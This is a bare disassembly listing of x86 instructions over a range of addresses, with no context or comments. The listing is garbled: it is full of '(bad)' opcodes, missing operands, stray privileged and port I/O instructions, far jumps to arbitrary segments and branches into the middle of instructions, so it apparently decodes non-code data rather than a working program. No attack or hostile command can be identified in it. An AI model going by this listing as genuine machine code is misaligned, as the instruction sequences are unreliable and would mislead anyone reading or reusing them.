  41e003:	outs   dx,DWORD PTR ds:[esi]
  41e004:	imul   edx,DWORD PTR [ebx-0x6ac26a47],0x11
  41e00b:	mov    cl,0x55
  41e00d:	cmp    eax,0x4cb44139
  41e012:	adc    ebp,DWORD PTR [edx+0x5dc016a0]
  41e018:	mov    ah,0xf2
  41e01a:	xchg   esi,eax
  41e01b:	or     al,0x52
  41e01d:	xor    DWORD PTR [esi+0x54],ecx
  41e020:	imul   esi,DWORD PTR [ebx-0x74],0xffffff98
  41e024:	adc    cl,BYTE PTR [ebx-0x26]
  41e027:	dec    ebx
  41e028:	test   DWORD PTR [edi],esp
  41e02a:	rol    BYTE PTR [edx],1
  41e02c:	cmp    DWORD PTR [ebx],ecx
  41e02e:	mov    edx,0xeda2f357
  41e033:	xor    BYTE PTR [edi+edi*4+0x5d],0x9d
  41e038:	push   ebx
  41e039:	add    al,0x5a
  41e03b:	jne    0x41e094
  41e03d:	outs   dx,BYTE PTR ds:[esi]
  41e03e:	sub    DWORD PTR [bp+di+0x4baa],ebx
  41e043:	jle    0x41dfdc
  41e045:	xchg   edx,eax
  41e046:	outs   dx,DWORD PTR ds:[esi]
  41e047:	mov    ?,ebp
  41e049:	in     eax,0x50
  41e04b:	jbe    0x41e036
  41e04d:	mov    dh,0x6b
  41e04f:	jns    0x41e0be
  41e051:	rol    DWORD PTR [edx-0x5d],cl
  41e054:	sbb    BYTE PTR ds:0x2949c0c4,al
  41e05a:	outs   dx,BYTE PTR cs:[esi]
  41e05c:	dec    eax
  41e05d:	scas   eax,DWORD PTR es:[edi]
  41e05e:	sub    bl,dh
  41e060:	mov    edi,0xb1f9695d
  41e065:	paddq  mm3,QWORD PTR [esi-0x78635e53]
  41e06c:	cld    
  41e06d:	and    al,0x80
  41e06f:	push   es
  41e070:	arpl   WORD PTR [edi+0x2304ebfd],bp
  41e076:	cmp    bh,BYTE PTR [ebp+0x7341ad29]
  41e07c:	jbe    0x41e026
  41e07e:	jnp    0x41e02b
  41e080:	stos   BYTE PTR es:[edi],al
  41e081:	in     al,0xba
  41e083:	jp     0x41e06b
  41e085:	jmp    0x41e010
  41e087:	in     al,dx
  41e088:	jecxz  0x41e05d
  41e08a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e08b:	(bad)  
  41e08c:	mov    esi,0xa979568b
  41e091:	inc    esi
  41e092:	aas    
  41e093:	cmp    bh,BYTE PTR [ebx]
  41e095:	imul   edx,DWORD PTR [ecx-0x3d],0x354602b6
  41e09c:	scas   eax,DWORD PTR es:[edi]
  41e09d:	lea    eax,[edi-0x56]
  41e0a0:	aas    
  41e0a1:	pop    ebp
  41e0a2:	pushf  
  41e0a3:	es pop esi
  41e0a5:	sbb    dh,dh
  41e0a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0a8:	pop    edx
  41e0a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0aa:	loope  0x41e041
  41e0ac:	inc    eax
  41e0ad:	pop    eax
  41e0ae:	xchg   ecx,eax
  41e0af:	xchg   BYTE PTR [ebx],al
  41e0b1:	mov    dh,0x84
  41e0b3:	jle    0x41e06b
  41e0b5:	mov    ebp,0x87f47e67
  41e0ba:	mov    edi,?
  41e0bc:	les    esp,FWORD PTR [edi-0x6cbe4359]
  41e0c2:	xchg   ch,ah
  41e0c4:	shl    BYTE PTR [ebp+edx*2-0x200bbfae],cl
  41e0cb:	gs aad 0xc4
  41e0ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0cf:	fsubr  QWORD PTR [ebx+0x34]
  41e0d2:	push   edx
  41e0d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0d4:	dec    ecx
  41e0d5:	sub    dl,0xe5
  41e0d8:	cli    
  41e0d9:	inc    edi
  41e0da:	or     BYTE PTR [esi],bh
  41e0dc:	push   ebp
  41e0dd:	add    al,0x72
  41e0df:	add    al,0x29
  41e0e1:	inc    edx
  41e0e2:	icebp  
  41e0e3:	int    0x12
  41e0e5:	adc    esp,DWORD PTR [eax+0x36]
  41e0e8:	in     eax,0xd7
  41e0ea:	lahf   
  41e0eb:	(bad)  
  41e0ec:	icebp  
  41e0ed:	into   
  41e0ee:	cmc    
  41e0ef:	int3   
  41e0f0:	mov    cl,0x7d
  41e0f2:	adc    al,0xdf
  41e0f4:	in     al,dx
  41e0f5:	outs   dx,DWORD PTR ds:[esi]
  41e0f6:	iret   
  41e0f7:	jmp    0x41e12e
  41e0f9:	lahf   
  41e0fa:	pop    edi
  41e0fb:	inc    ecx
  41e0fc:	inc    ebx
  41e0fd:	ins    DWORD PTR es:[edi],dx
  41e0fe:	xchg   DWORD PTR [ebp+0x16f5ad0a],ebp
  41e104:	dec    edi
  41e105:	xor    BYTE PTR [ecx+esi*2+0x582850ca],0x6f
  41e10d:	inc    esi
  41e10e:	loop   0x41e13c
  41e110:	(bad)  [ebx-0x4d]
  41e113:	add    al,BYTE PTR [ecx]
  41e115:	mul    DWORD PTR [eax]
  41e117:	jge    0x41e11d
  41e119:	jmp    0xd1b4af5
  41e11e:	mov    dh,0x27
  41e120:	pop    edx
  41e121:	mov    bl,0x3d
  41e123:	sbb    ecx,DWORD PTR [edx+esi*2]
  41e126:	div    DWORD PTR [edi]
  41e128:	dec    esi
  41e129:	outs   dx,DWORD PTR ds:[esi]
  41e12a:	cdq    
  41e12b:	xchg   DWORD PTR [edx+0x2],edx
  41e12e:	stos   DWORD PTR es:[edi],eax
  41e12f:	mov    ds:0xe7ff1ae7,eax
  41e134:	ins    DWORD PTR es:[edi],dx
  41e135:	cmc    
  41e136:	call   0xcdd0:0xf5831a5c
  41e13d:	dec    esp
  41e13e:	pop    ebp
  41e13f:	dec    ebp
  41e140:	test   DWORD PTR [eax+eax*4],ebx
  41e143:	int    0x80
  41e145:	jp     0x41e1c1
  41e147:	pop    esi
  41e148:	sbb    DWORD PTR [edi-0x72],ecx
  41e14b:	pushf  
  41e14c:	push   esi
  41e14d:	cmp    BYTE PTR [ebx-0x40017c81],ah
  41e153:	sub    al,0xac
  41e155:	fidivr WORD PTR [ebx]
  41e157:	ins    BYTE PTR es:[edi],dx
  41e158:	scas   eax,DWORD PTR es:[edi]
  41e159:	fstp   TBYTE PTR [ebx+0x31154029]
  41e15f:	cmp    ebp,DWORD PTR [edx-0x396b2ee]
  41e165:	mov    edi,0x7979202a
  41e16a:	out    dx,al
  41e16b:	imul   eax,DWORD PTR [eax],0xdc8c0f5f
  41e171:	enter  0x3561,0x75
  41e175:	jmp    0x93d8:0x38e8f23e
  41e17c:	mov    dh,0xe0
  41e17e:	loopne 0x41e120
  41e180:	pop    ebp
  41e181:	add    al,0x6b
  41e183:	mov    esi,0xd734e3f6
  41e188:	enter  0x59fe,0x44
  41e18c:	mov    eax,ds:0xcf97d7b0
  41e191:	sbb    eax,0x2f05d5d9
  41e196:	ins    BYTE PTR es:[edi],dx
  41e197:	push   es
  41e198:	cmp    cl,ch
  41e19a:	push   eax
  41e19b:	ds ds js 0x41e184
  41e19f:	push   ebx
  41e1a0:	and    ch,bh
  41e1a2:	and    al,0x9
  41e1a4:	shl    ebp,0x9b
  41e1a7:	cmp    al,0xe8
  41e1a9:	pop    eax
  41e1aa:	imul   esp,DWORD PTR [edx],0x4349f3eb
  41e1b0:	sahf   
  41e1b1:	fwait
  41e1b2:	adc    BYTE PTR [ecx-0x2],ah
  41e1b5:	and    al,0x1
  41e1b7:	xchg   edi,eax
  41e1b8:	mov    DWORD PTR [ecx-0xe],eax
  41e1bb:	push   esi
  41e1bc:	jg     0x41e176
  41e1be:	(bad)  
  41e1c0:	and    BYTE PTR [ebp+0x42a1f4d5],0x4b
  41e1c7:	aam    0x74
  41e1c9:	mov    fs:0x8ca29222,al
  41e1cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1d0:	pop    esi
  41e1d1:	pop    esp
  41e1d2:	pushf  
  41e1d3:	iret   
  41e1d4:	iret   
  41e1d5:	cmp    al,0x23
  41e1d7:	sub    ah,BYTE PTR [edi-0x1cfd7c9f]
  41e1dd:	popa   
  41e1de:	pop    ebp
  41e1df:	pop    edi
  41e1e0:	push   edi
  41e1e1:	fisttp WORD PTR [esi-0x20]
  41e1e4:	test   eax,0x9c853d1b
  41e1e9:	aaa    
  41e1ea:	call   FWORD PTR [edx]
  41e1ec:	scas   eax,DWORD PTR es:[edi]
  41e1ed:	aam    0xca
  41e1ef:	std    
  41e1f0:	(bad)  
  41e1f1:	lods   eax,DWORD PTR ds:[esi]
  41e1f2:	imul   esp,DWORD PTR [ecx],0x7490cbf5
  41e1f8:	es scas eax,DWORD PTR es:[edi]
  41e1fa:	push   ebx
  41e1fb:	stc    
  41e1fc:	test   al,0x25
  41e1fe:	pop    edx
  41e1ff:	adc    al,0xd8
  41e201:	cmp    eax,0x6acef4f5
  41e206:	ss jbe 0x41e200
  41e209:	adc    BYTE PTR [eax+0x54],dl
  41e20c:	mov    ebx,0x1f82ab95
  41e211:	ins    DWORD PTR es:[edi],dx
  41e212:	ins    DWORD PTR es:[edi],dx
  41e213:	pop    ebx
  41e214:	mov    ebp,0x43e33695
  41e219:	rol    dh,cl
  41e21b:	mov    ch,BYTE PTR [ebx-0x4236101c]
  41e221:	fwait
  41e222:	or     edx,edx
  41e224:	inc    eax
  41e225:	retf   0xb709
  41e228:	sar    esi,0x31
  41e22b:	es cld 
  41e22d:	pop    es
  41e22e:	ins    DWORD PTR es:[edi],dx
  41e22f:	dec    ecx
  41e230:	mov    cl,0xf2
  41e232:	xor    al,0x16
  41e234:	sbb    al,BYTE PTR [edx]
  41e236:	pop    esi
  41e237:	dec    edx
  41e238:	call   0x7463:0x204ee901
  41e23f:	setbe  BYTE PTR [edx-0x51]
  41e243:	fmul   st(0),st
  41e245:	add    ebx,edi
  41e247:	test   eax,0xf8e58888
  41e24c:	shr    DWORD PTR [ebx+0x22],1
  41e24f:	test   DWORD PTR [edi],0x5f9857c6
  41e255:	lea    edi,[ecx+eax*4+0x18f1e315]
  41e25c:	mov    WORD PTR [ebp+0x45],es
  41e25f:	mov    eax,0x4676b34
  41e264:	sbb    esp,DWORD PTR [edx]
  41e266:	in     eax,0x60
  41e268:	fisttp WORD PTR [esi]
  41e26a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e26b:	pop    ss
  41e26c:	xchg   edi,eax
  41e26d:	jo     0x41e262
  41e26f:	dec    edx
  41e270:	dec    ebp
  41e271:	or     eax,0x24f8bae9
  41e276:	pop    edi
  41e277:	fst    DWORD PTR [ecx]
  41e279:	sub    eax,0x99b9342f
  41e27e:	mov    ebp,0xd2abffb2
  41e283:	cmc    
  41e284:	pop    edi
  41e285:	in     al,dx
  41e286:	mov    ds:0x20c92a75,eax
  41e28b:	adc    BYTE PTR [edx],ch
  41e28d:	in     al,0xe
  41e28f:	push   ss
  41e290:	lahf   
  41e291:	pop    esp
  41e292:	xchg   DWORD PTR [esp+edx*1],edi
  41e295:	data16 test BYTE PTR cs:[ecx+0x2f755772],bl
  41e29d:	call   0xe9498a3d
  41e2a2:	fdiv   QWORD PTR [eax+0x25]
  41e2a5:	loop   0x41e2f2
  41e2a7:	cmp    eax,0xd76bf743
  41e2ac:	push   cs
  41e2ad:	pmaxub mm1,QWORD PTR [ecx-0x5f1c757]
  41e2b4:	adc    BYTE PTR [eax-0x7d81a94d],0x5c
  41e2bb:	mov    al,0x9c
  41e2bd:	xlat   BYTE PTR ds:[ebx]
  41e2be:	mov    ah,0x43
  41e2c0:	psubusw mm3,mm4
  41e2c3:	cs jmp 0x41e307
  41e2c6:	mov    ah,bl
  41e2c8:	and    BYTE PTR cs:[ecx+0x6a],bh
  41e2cc:	aam    0x71
  41e2ce:	data16 cmp bl,BYTE PTR ds:0x1184bde7
  41e2d5:	push   0xffffffda
  41e2d7:	ins    BYTE PTR es:[edi],dx
  41e2d8:	mov    BYTE PTR [ebx-0x14c54fe6],ah
  41e2de:	lock mov ecx,0xe6e0bc84
  41e2e4:	and    esp,DWORD PTR [ebp-0x43745a88]
  41e2ea:	push   ds
  41e2eb:	or     al,0xc0
  41e2ed:	fcmovbe st,st(7)
  41e2ef:	add    dl,BYTE PTR [esi-0x11]
  41e2f2:	add    ebx,DWORD PTR [edi]
  41e2f4:	push   edi
  41e2f5:	fwait
  41e2f6:	stc    
  41e2f7:	push   esp
  41e2f8:	mov    ah,0x17
  41e2fa:	iret   
  41e2fb:	or     esp,DWORD PTR [eax+0x40]
  41e2fe:	enter  0x3ac7,0xd1
  41e302:	loop   0x41e36c
  41e304:	mov    ch,0xf
  41e306:	jmp    0x41e309
  41e308:	sub    eax,0x881a2923
  41e30d:	cmp    DWORD PTR [edx],ebp
  41e30f:	je     0x41e2b7
  41e311:	imul   ebp,DWORD PTR [ebp-0x55698f98],0xffffffd3
  41e318:	fwait
  41e319:	int3   
  41e31a:	xchg   edx,eax
  41e31b:	xchg   ecx,eax
  41e31c:	push   ebp
  41e31d:	mov    ecx,?
  41e31f:	pop    ebx
  41e320:	sub    dl,BYTE PTR [eax+0x646bae89]
  41e326:	fs daa 
  41e328:	pop    es
  41e329:	lock mov edx,0x2938428f
  41e32f:	jle    0x41e352
  41e331:	fnstcw WORD PTR [edx]
  41e333:	sbb    al,0x36
  41e335:	cmp    eax,0x61a8f41f
  41e33a:	xchg   edi,eax
  41e33b:	aaa    
  41e33c:	add    al,0xd6
  41e33e:	cmp    edx,ebx
  41e340:	inc    ebx
  41e341:	or     al,0x38
  41e343:	and    DWORD PTR [edi],ecx
  41e345:	pop    es
  41e346:	mov    al,0x53
  41e348:	cli    
  41e349:	xchg   ecx,eax
  41e34a:	dec    ebx
  41e34b:	jmp    0x41e355
  41e34d:	enter  0x1ea0,0x46
  41e351:	lea    eax,[ebx]
  41e353:	call   eax
  41e355:	push   edx
  41e356:	popf   
  41e357:	ins    DWORD PTR es:[edi],dx
  41e358:	jmp    0xd170:0x81da26c
  41e35f:	stc    
  41e360:	retf   
  41e361:	jo     0x41e3d4
  41e363:	popf   
  41e364:	test   ch,cl
  41e366:	jmp    0x1e899471
  41e36b:	xor    DWORD PTR [ecx-0x3a4fde40],ecx
  41e371:	push   ds
  41e372:	mov    BYTE PTR [ebx-0x32189016],dl
  41e378:	aas    
  41e379:	imul   eax,DWORD PTR ds:0xfc927bdc,0x1e
  41e380:	fdivr  QWORD PTR [ebp-0x72393f40]
  41e386:	shr    DWORD PTR [edi+eiz*2],1
  41e389:	xor    eax,0x8d094f13
  41e38e:	into   
  41e38f:	jl     0x41e330
  41e391:	idiv   DWORD PTR [edx]
  41e393:	leave  
  41e394:	mov    edi,0x917f572
  41e399:	lahf   
  41e39a:	test   bh,0x87
  41e39d:	in     al,0x5f
  41e39f:	pop    ss
  41e3a0:	fdiv   DWORD PTR [eax]
  41e3a2:	add    eax,0x1063f7e9
  41e3a7:	out    dx,al
  41e3a8:	lea    ebx,[edx+0x4a]
  41e3ab:	int    0xbb
  41e3ad:	sahf   
  41e3ae:	outs   dx,DWORD PTR ds:[esi]
  41e3af:	shl    esp,1
  41e3b1:	xchg   esi,eax
  41e3b2:	xlat   BYTE PTR ds:[ebx]
  41e3b3:	cmp    eax,eax
  41e3b5:	pop    ebp
  41e3b6:	cdq    
  41e3b7:	ins    DWORD PTR es:[edi],dx
  41e3b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3b9:	gs adc eax,0xb7beed0d
  41e3bf:	dec    edi
  41e3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3c1:	nop
  41e3c2:	mov    esp,0xd82381e0
  41e3c7:	dec    ecx
  41e3c8:	adc    ah,BYTE PTR [esi]
  41e3ca:	stos   DWORD PTR es:[edi],eax
  41e3cb:	pusha  
  41e3cc:	in     eax,0x6
  41e3ce:	in     al,dx
  41e3cf:	pop    ebx
  41e3d0:	cld    
  41e3d1:	mov    edx,0xec2f9b8d
  41e3d6:	sbb    DWORD PTR [edx+0x36],0xffffff86
  41e3da:	test   BYTE PTR [esi+0x64],dh
  41e3dd:	mov    esi,0x8cb3be98
  41e3e2:	sbb    DWORD PTR [edx+0x48],esp
  41e3e5:	fisubr WORD PTR [ecx-0x21]
  41e3e8:	repz scas al,BYTE PTR es:[edi]
  41e3ea:	jns    0x41e38f
  41e3ec:	data16 and BYTE PTR [ebx],dl
  41e3ef:	cli    
  41e3f0:	out    dx,al
  41e3f1:	in     al,0x56
  41e3f3:	push   0xae854448
  41e3f8:	stos   BYTE PTR es:[edi],al
  41e3f9:	xchg   edx,eax
  41e3fa:	jns    0x41e410
  41e3fc:	mov    ebp,0x8d03b546
  41e401:	xchg   esi,eax
  41e402:	loope  0x41e476
  41e404:	retf   0x1b2a
  41e407:	bsr    edi,DWORD PTR [ecx-0x6b]
  41e40b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e40c:	repnz or bl,0xf3
  41e410:	mov    bl,ah
  41e412:	scas   eax,DWORD PTR es:[edi]
  41e413:	jp     0x41e3e2
  41e415:	lock or DWORD PTR [ebp+0x2a],esp
  41e419:	(bad)  
  41e41a:	gs inc ebx
  41e41c:	cmp    al,0x5a
  41e41e:	scas   al,BYTE PTR es:[edi]
  41e41f:	jmp    0x41e407
  41e421:	cmp    al,0x9f
  41e423:	inc    ecx
  41e424:	test   DWORD PTR [ecx],ecx
  41e426:	stc    
  41e427:	mov    edi,0x5d442aa5
  41e42c:	or     DWORD PTR [edx-0x1081b483],esp
  41e432:	retf   0x6a27
  41e435:	fcom   st(3)
  41e437:	retf   
  41e438:	cmp    eax,0x21e71b1a
  41e43d:	inc    ebp
  41e43e:	xchg   bx,ax
  41e440:	add    DWORD PTR [ebx+esi*4-0x386befde],esi
  41e447:	shl    BYTE PTR [esi+edx*1+0x50],1
  41e44b:	dec    edi
  41e44c:	jmp    0x41e461
  41e44e:	repnz stc 
  41e450:	es dec ebx
  41e452:	or     al,0x8b
  41e454:	into   
  41e455:	repz imul edi,ebp,0x1ddff48a
  41e45c:	aad    0x48
  41e45e:	xchg   ecx,eax
  41e45f:	repz add ecx,DWORD PTR [ebx-0x58c5db7e]
  41e466:	imul   edi,DWORD PTR [eax+0x2e],0x6d08cab7
  41e46d:	outs   dx,DWORD PTR ds:[esi]
  41e46e:	mov    edi,DWORD PTR [eax-0x46]
  41e471:	lea    ebx,[eax-0x41fb4fb]
  41e477:	xchg   ebx,eax
  41e478:	mov    al,0xe7
  41e47a:	add    al,0x18
  41e47c:	cdq    
  41e47d:	addr16 adc al,0xc1
  41e480:	mov    edi,0xfa65dff0
  41e485:	sub    cl,BYTE PTR [eax-0x47942b34]
  41e48b:	jnp    0x41e44d
  41e48d:	mov    edx,esi
  41e48f:	pusha  
  41e490:	xor    ebp,DWORD PTR ds:0x79b38395
  41e496:	jo     0x41e4c7
  41e498:	dec    ebp
  41e499:	(bad)  
  41e49a:	adc    eax,0x95df5e5
  41e49f:	xchg   DWORD PTR [esp+edi*8],esp
  41e4a2:	sub    al,0xc3
  41e4a4:	(bad)  
  41e4a5:	xchg   esi,eax
  41e4a6:	aam    0xdc
  41e4a8:	dec    ecx
  41e4a9:	(bad)  
  41e4aa:	adc    eax,0x417c9f4f
  41e4af:	in     eax,0x6d
  41e4b1:	or     ebx,DWORD PTR [eax]
  41e4b3:	cwde   
  41e4b4:	scas   eax,DWORD PTR es:[edi]
  41e4b5:	scas   eax,DWORD PTR es:[edi]
  41e4b6:	addr16 loop 0x41e44a
  41e4b9:	and    dh,cl
  41e4bb:	out    dx,eax
  41e4bc:	rcl    ebx,0xc9
  41e4bf:	mov    eax,ds:0x9f78441a
  41e4c4:	mov    dh,0xfa
  41e4c6:	mov    esp,DWORD PTR [eax]
  41e4c8:	out    0x40,eax
  41e4ca:	mov    edx,0xb4036736
  41e4cf:	add    BYTE PTR [eax],0xb9
  41e4d2:	imul   ebx,DWORD PTR [edx],0xffffffbb
  41e4d5:	inc    ebx
  41e4d6:	(bad)  
  41e4d7:	in     al,0x44
  41e4d9:	jmp    0x12caf2b5
  41e4de:	or     ebx,ecx
  41e4e0:	push   ebp
  41e4e1:	sub    ecx,edi
  41e4e3:	add    ecx,DWORD PTR [ebp-0x9c93985]
  41e4e9:	push   eax
  41e4ea:	aaa    
  41e4eb:	and    al,0x2f
  41e4ed:	pop    esp
  41e4ee:	stc    
  41e4ef:	out    dx,eax
  41e4f0:	test   al,ah
  41e4f2:	xlat   BYTE PTR ds:[ebx]
  41e4f3:	xchg   ebx,eax
  41e4f4:	popa   
  41e4f5:	pop    esi
  41e4f6:	xor    BYTE PTR ds:[eax-0x20],bh
  41e4fa:	xor    dl,BYTE PTR [esi+0x77d364ef]
  41e500:	(bad)  [eax+0x59]
  41e503:	in     eax,0xc9
  41e505:	jmp    0xac17:0x153db031
  41e50c:	fiadd  WORD PTR [edx+eax*4+0x51]
  41e510:	pop    esi
  41e511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e512:	clc    
  41e513:	retf   0x4e0e
  41e516:	sub    DWORD PTR gs:[eax],0x6a
  41e51a:	imul   esi,ebx,0x52aa1d57
  41e520:	inc    esi
  41e521:	pusha  
  41e522:	(bad)  
  41e523:	out    dx,al
  41e524:	aad    0x44
  41e526:	mov    ecx,0xb7d5609e
  41e52b:	xor    eax,0xed12de3
  41e530:	scas   eax,DWORD PTR es:[edi]
  41e531:	aad    0xf6
  41e533:	jb     0x41e512
  41e535:	jo     0x41e50a
  41e537:	adc    bh,BYTE PTR [ebx-0x55]
  41e53a:	add    cl,BYTE PTR [ecx]
  41e53c:	mov    edi,0xbbf17234
  41e541:	and    eax,0x28965c19
  41e546:	popa   
  41e547:	lods   eax,DWORD PTR ds:[esi]
  41e548:	mov    ebx,0x1433356d
  41e54d:	test   BYTE PTR [ebp+0x238c04c8],ah
  41e553:	add    BYTE PTR ds:0x9311c7f2,ch
  41e559:	ds cdq 
  41e55b:	ja     0x41e5af
  41e55d:	sbb    eax,0x6f246540
  41e562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e563:	call   0xe381:0x2a49ee65
  41e56a:	pop    ebp
  41e56b:	mov    bh,0xf7
  41e56d:	int    0x1a
  41e56f:	lahf   
  41e570:	jge    0x41e5e5
  41e572:	pop    esp
  41e573:	jge    0x41e584
  41e575:	std    
  41e576:	jge    0x41e538
  41e578:	xor    eax,DWORD PTR [esi-0x5c]
  41e57b:	mov    ebp,0x96f4c5e7
  41e580:	xchg   esp,eax
  41e581:	mov    ebx,0xd8f967a1
  41e586:	loope  0x41e589
  41e588:	add    DWORD PTR [ebx],edx
  41e58a:	pop    edx
  41e58b:	call   0xe9aa:0x417f
  41e592:	or     DWORD PTR [edi-0x41],ebx
  41e595:	push   ebp
  41e596:	dec    ecx
  41e597:	push   ss
  41e598:	add    cl,0x8b
  41e59b:	sub    ah,bl
  41e59d:	adc    al,0xb0
  41e59f:	loopne 0x41e593
  41e5a1:	or     edx,DWORD PTR [edi]
  41e5a3:	fs leave 
  41e5a5:	cdq    
  41e5a6:	pop    edx
  41e5a7:	das    
  41e5a8:	inc    edi
  41e5a9:	push   eax
  41e5aa:	ds inc ebp
  41e5ac:	mov    ds:0x68f5188,eax
  41e5b1:	rcl    BYTE PTR [ebx+0x4f],0x87
  41e5b5:	pop    es
  41e5b6:	cmp    eax,0x1f835c51
  41e5bb:	or     cl,BYTE PTR [ecx-0x3380f530]
  41e5c1:	jae    0x41e599
  41e5c3:	js     0x41e605
  41e5c5:	push   ebx
  41e5c6:	scas   eax,DWORD PTR es:[edi]
  41e5c7:	icebp  
  41e5c8:	clc    
  41e5c9:	das    
  41e5ca:	ss pop esi
  41e5cc:	das    
  41e5cd:	sub    BYTE PTR [ecx],al
  41e5cf:	xchg   edx,eax
  41e5d0:	push   ebp
  41e5d1:	pusha  
  41e5d2:	fstp   TBYTE PTR [eax-0x23]
  41e5d5:	pop    ss
  41e5d6:	pop    edi
  41e5d7:	scas   al,BYTE PTR es:[edi]
  41e5d8:	fistp  WORD PTR [ecx+0x5ca0562a]
  41e5de:	xlat   BYTE PTR ds:[ebx]
  41e5df:	int3   
  41e5e0:	scas   al,BYTE PTR es:[edi]
  41e5e1:	lds    ebp,FWORD PTR [ebp+0x7d]
  41e5e4:	mov    bl,0x3c
  41e5e6:	jns    0x41e5a5
  41e5e8:	push   esi
  41e5e9:	hlt    
  41e5ea:	fwait
  41e5eb:	push   eax
  41e5ec:	in     eax,0x6
  41e5ee:	jns    0x41e5b9
  41e5f0:	push   ebp
  41e5f1:	add    eax,0x6272e35f
  41e5f6:	push   esi
  41e5f7:	mov    edi,0xf2c5857d
  41e5fc:	push   ds
  41e5fd:	jno    0x41e57f
  41e5ff:	add    esi,DWORD PTR [ecx-0x7854eccb]
  41e605:	enter  0x9085,0x95
  41e609:	adc    BYTE PTR [edi-0x11],bl
  41e60c:	jge    0x41e59d
  41e60e:	push   esp
  41e60f:	jp     0x41e667
  41e611:	lods   eax,DWORD PTR ds:[esi]
  41e612:	sub    edi,esp
  41e614:	dec    ebx
  41e615:	or     esi,edx
  41e617:	lods   al,BYTE PTR es:[esi]
  41e619:	xor    edx,ebp
  41e61b:	jmp    0x4d241ff0
  41e620:	xlat   BYTE PTR ds:[ebx]
  41e621:	cmc    
  41e622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e623:	lods   al,BYTE PTR ds:[esi]
  41e624:	retf   
  41e625:	xchg   ecx,eax
  41e626:	push   eax
  41e627:	ins    BYTE PTR es:[edi],dx
  41e628:	cmp    al,0xb9
  41e62a:	adc    DWORD PTR [edi],edi
  41e62c:	jge    0x41e675
  41e62e:	sar    edx,1
  41e630:	es jp  0x41e5dc
  41e633:	push   es
  41e634:	jle    0x41e5e2
  41e636:	mov    ds:0x7a9a1dc,eax
  41e63b:	pop    edi
  41e63c:	or     al,0xa4
  41e63e:	jge    0x41e610
  41e640:	neg    BYTE PTR [ebx+0x8]
  41e643:	push   ecx
  41e644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e645:	iret   
  41e646:	dec    esp
  41e647:	inc    edx
  41e648:	sti    
  41e649:	mov    bl,0x82
  41e64b:	cdq    
  41e64c:	push   edx
  41e64d:	adc    eax,0x28914c95
  41e652:	fsubr  st,st(1)
  41e654:	jo     0x41e68b
  41e656:	loopne 0x41e618
  41e658:	xor    BYTE PTR [edi-0x5dbd5b08],cl
  41e65e:	push   edx
  41e65f:	xchg   esi,eax
  41e660:	data16 jmp 0x41e67c
  41e663:	shl    DWORD PTR [ebx],cl
  41e665:	arpl   WORD PTR [ecx],ax
  41e667:	inc    ebx
  41e668:	xor    edx,esi
  41e66a:	fwait
  41e66b:	and    al,0x74
  41e66d:	sub    al,0x8d
  41e66f:	(bad)  [ecx+0x43]
  41e672:	or     al,bh
  41e674:	inc    esi
  41e675:	mov    ds:0xbbc1210f,al
  41e67b:	ret    
  41e67c:	iret   
  41e67d:	push   0x1c802b35
  41e682:	cwde   
  41e683:	push   eax
  41e684:	scas   al,BYTE PTR es:[edi]
  41e685:	sub    eax,edi
  41e687:	mov    bl,0x93
  41e689:	xor    dh,dl
  41e68b:	shr    DWORD PTR [ecx+0x10fb5560],0x19
  41e692:	sub    BYTE PTR [edi+0x6db8a4ef],cl
  41e698:	dec    ecx
  41e699:	fstp   QWORD PTR [ebx+0xb602761]
  41e69f:	sbb    ch,dh
  41e6a1:	adc    eax,0x7ca24092
  41e6a6:	sbb    eax,0xdeaf02c1
  41e6ab:	mov    edx,0x99acb639
  41e6b0:	(bad)  [ebx+0x1a]
  41e6b3:	out    dx,eax
  41e6b4:	cli    
  41e6b5:	xchg   ebp,eax
  41e6b6:	stos   BYTE PTR es:[edi],al
  41e6b7:	inc    esp
  41e6b8:	push   ds
  41e6b9:	lods   al,BYTE PTR ds:[esi]
  41e6ba:	sub    eax,0xf2b2f42e
  41e6bf:	and    bl,BYTE PTR [ebx+eax*2+0x5f]
  41e6c3:	cmp    DWORD PTR ds:0x7dfeb860,ecx
  41e6c9:	sbb    al,0x1
  41e6cb:	inc    esi
  41e6cc:	loopne 0x41e691
  41e6ce:	cdq    
  41e6cf:	pop    ds
  41e6d0:	xchg   esi,eax
  41e6d1:	mov    WORD PTR [eax+0x39],fs
  41e6d4:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e6d6:	out    0xc6,al
  41e6d8:	sbb    al,0xec
  41e6da:	add    ah,BYTE PTR [eax+ecx*2+0x3c]
  41e6de:	lods   al,BYTE PTR ds:[esi]
  41e6df:	jno    0x41e6dd
  41e6e1:	mov    eax,0x87b029e6
  41e6e6:	add    al,ah
  41e6e8:	inc    ebx
  41e6e9:	dec    esp
  41e6ea:	loopne 0x41e670
  41e6ec:	or     al,0x10
  41e6ee:	push   0x99610686
  41e6f3:	cmp    BYTE PTR [ebp+0x75],bh
  41e6f6:	inc    edx
  41e6f7:	jb     0x41e771
  41e6f9:	mov    dl,0x37
  41e6fb:	xchg   esp,eax
  41e6fc:	pusha  
  41e6fd:	(bad)  
  41e6fe:	cwde   
  41e6ff:	aaa    
  41e700:	mov    ch,0x9a
  41e702:	jl     0x41e748
  41e704:	lea    esi,[ebx+0xe]
  41e707:	mov    ecx,0x6982ed79
  41e70c:	(bad)  
  41e70d:	lock cmp eax,0x168cd612
  41e713:	cmp    BYTE PTR [edx+0x193fe27a],0x7b
  41e71a:	pop    edi
  41e71b:	gs in  al,0x8
  41e71e:	ret    0x855
  41e721:	pop    eax
  41e722:	cmp    eax,0x9f4738ea
  41e727:	into   
  41e728:	push   eax
  41e729:	sub    al,0x94
  41e72b:	pop    ebp
  41e72c:	retf   0x6713
